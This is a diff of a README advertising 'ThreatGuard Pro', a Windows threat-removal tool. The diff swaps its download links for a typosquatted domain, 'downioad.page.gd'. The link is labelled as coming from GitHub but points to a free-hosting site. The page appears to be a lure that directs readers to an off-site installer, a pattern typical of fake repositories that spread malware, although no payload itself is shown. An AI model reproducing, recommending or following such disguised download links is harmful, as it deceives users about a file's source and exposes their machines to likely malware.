@@ -2,7 +2,7 @@
 
 ThreatGuard Pro is a powerful threat removal tool designed specifically for Windows 10 and 11 users. This advanced security suite offers a robust solution for cleaning and safeguarding your computer against various digital threats in 2026. With its intuitive interface and efficient scanning capabilities, it ensures your system remains optimized and secure without compromising performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -70,6 +70,6 @@ Whether you're dealing with sluggish performance or want to proactively protect 
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 © 2026 ThreatGuard Team. All rights reserved. This software is provided as-is for Windows desktop use only.
